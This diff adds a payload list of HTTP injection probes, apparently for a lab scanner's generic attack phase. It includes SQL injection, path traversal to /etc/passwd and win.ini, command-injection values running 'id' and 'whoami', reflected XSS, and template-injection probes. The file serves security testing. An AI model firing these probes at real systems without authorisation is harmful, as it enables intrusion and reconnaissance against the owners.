@@ -1,0 +1,30 @@
+# Injection probes fired on the query string during the generic HTTP attack
+# phase. These are benign detection payloads (the lab honeypot logs them); a
+# 5xx response is flagged as interesting. One path per line; '#' is a comment.
+
+# --- SQL injection ---
+/?id=1'
+/?id=1%27%20OR%20%271%27%3D%271
+/?id=1%20OR%201%3D1
+/search?q=%27%20UNION%20SELECT%20NULL--
+/product?id=-1%20UNION%20SELECT%201,2,3--
+
+# --- path traversal / LFI ---
+/?file=../../../../etc/passwd
+/?page=../../../../etc/passwd%00
+/?include=/etc/passwd
+/download?path=..%2f..%2f..%2f..%2fetc%2fpasswd
+/?lang=../../../../../../windows/win.ini
+
+# --- command injection ---
+/?cmd=;id
+/?host=127.0.0.1%3Bid
+/ping?ip=127.0.0.1%7Cwhoami
+
+# --- reflected XSS ---
+/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
+/search?term=%22%3E%3Csvg%2Fonload%3Dalert(1)%3E
+
+# --- SSTI / template injection ---
+/?name=%7B%7B7*7%7D%7D
+/?q=%24%7B7*7%7D
